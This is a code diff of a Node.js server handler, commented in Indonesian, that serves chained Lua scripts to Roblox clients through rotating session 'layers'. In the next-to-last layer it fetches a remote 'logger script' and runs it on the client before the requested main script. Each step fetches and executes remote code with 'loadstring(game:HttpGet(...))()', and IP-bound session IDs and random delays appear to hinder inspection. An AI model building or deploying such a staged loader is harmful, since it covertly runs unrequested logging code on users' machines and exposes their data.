@@ -4,7 +4,7 @@ const https = require('https');
 // SETTINGS
 // ============================
 const SETTINGS = {
-    TOTAL_LAYERS: 5,  // 5 LAYER
+    TOTAL_LAYERS: 5,  // BISA DIUBAH SESUAI KEHENDAK
     MIN_WAIT: 112, 
     MAX_WAIT: 119, 
     SESSION_EXPIRY: 10000, 
@@ -84,6 +84,7 @@ module.exports = async function(req, res) {
     const currentStep = parseInt(step) || 0;
     const host = req.headers.host;
     const currentPath = urlParts[0];
+    const totalLayers = SETTINGS.TOTAL_LAYERS;
     
     try {
         if (currentStep > 0) {
@@ -129,9 +130,6 @@ module.exports = async function(req, res) {
             session.used = true;
         }
         
-        // ==========================================
-        // LAYER 1: INISIALISASI
-        // ==========================================
         if (currentStep === 0) {
             const ipPart = cleanIp.split('.').pop() || "0";
             const seed = parseInt(ipPart) + Math.floor(Math.random() * 10000);
@@ -141,7 +139,7 @@ module.exports = async function(req, res) {
             const waitTime = Math.floor(Math.random() * (SETTINGS.MAX_WAIT - SETTINGS.MIN_WAIT)) + SETTINGS.MIN_WAIT;
             
             let sequence = [];
-            while(sequence.length < SETTINGS.TOTAL_LAYERS) {
+            while(sequence.length < totalLayers) {
                 let r = Math.floor(Math.random() * 300) + 1;
                 if(!sequence.includes(r)) sequence.push(r);
             }
@@ -164,10 +162,8 @@ module.exports = async function(req, res) {
             return res.status(200).send(luaScript);
         }
         
-        // ==========================================
-        // LAYER 2-3: ROTASI GHOST ID
-        // ==========================================
-        if (sessions[id].currentIndex < 3) {
+        // LAYER TENGAH (bukan logger, bukan main)
+        if (sessions[id].currentIndex < totalLayers - 2) {
             const session = sessions[id];
             session.currentIndex++; 
             
@@ -198,16 +194,12 @@ module.exports = async function(req, res) {
             return res.status(200).send(luaScript);
         }
         
-        // ==========================================
-        // LAYER 4: KIRIM LOGGER SCRIPT
-        // ==========================================
-        if (sessions[id].currentIndex === 3) {
+        // LAYER SEBELUM TERAKHIR: KIRIM LOGGER SCRIPT
+        if (sessions[id].currentIndex === totalLayers - 2) {
             const session = sessions[id];
             
-            // Ambil logger script dari GitHub
             const loggerScript = await fetchRaw(SETTINGS.LOGGER_SCRIPT_URL);
             
-            // Rotasi ke layer 5
             session.currentIndex++;
             
             const ipPart = cleanIp.split('.').pop() || "0";
@@ -218,7 +210,6 @@ module.exports = async function(req, res) {
             const nextKey = Math.random().toString(36).substring(2, 8);
             const waitTime = Math.floor(Math.random() * (SETTINGS.MAX_WAIT - SETTINGS.MIN_WAIT)) + SETTINGS.MIN_WAIT;
             
-            // Simpan session baru untuk layer 5
             sessions[newSessionID] = {
                 ownerIP: session.ownerIP,
                 stepSequence: session.stepSequence,
@@ -233,33 +224,18 @@ module.exports = async function(req, res) {
             
             delete sessions[id];
             
-            // Kirim logger script + link ke layer 5
             const nextUrl = "https://" + host + currentPath + "?" + nextStepNumber + "." + newSessionID + "." + nextKey;
-            const luaScript = `
--- ==========================================
--- LOGGER SCRIPT (LAYER 4)
--- ==========================================
-${loggerScript || ''}
-
--- ==========================================
--- LANJUT KE LAYER 5 (MAIN SCRIPT)
--- ==========================================
-task.wait(${waitTime / 1000})
-loadstring(game:HttpGet("${nextUrl}"))()
-`;
+            const luaScript = loggerScript + "\n\ntask.wait(" + (waitTime / 1000) + ") loadstring(game:HttpGet(\"" + nextUrl + "\"))()";
             
             return res.status(200).send(luaScript);
         }
         
-        // ==========================================
-        // LAYER 5: KIRIM MAIN SCRIPT
-        // ==========================================
-        if (sessions[id].currentIndex === 4) {
-            // Ambil main script dari GitHub
+        // LAYER TERAKHIR: KIRIM MAIN SCRIPT
+        if (sessions[id].currentIndex === totalLayers - 1) {
             const mainScript = await fetchRaw(SETTINGS.REAL_SCRIPT_URL);
             
             delete sessions[id];
-            return res.status(200).send(mainScript || '-- MAIN SCRIPT NOT FOUND');
+            return res.status(200).send(mainScript || '');
         }
         
     } catch (err) {
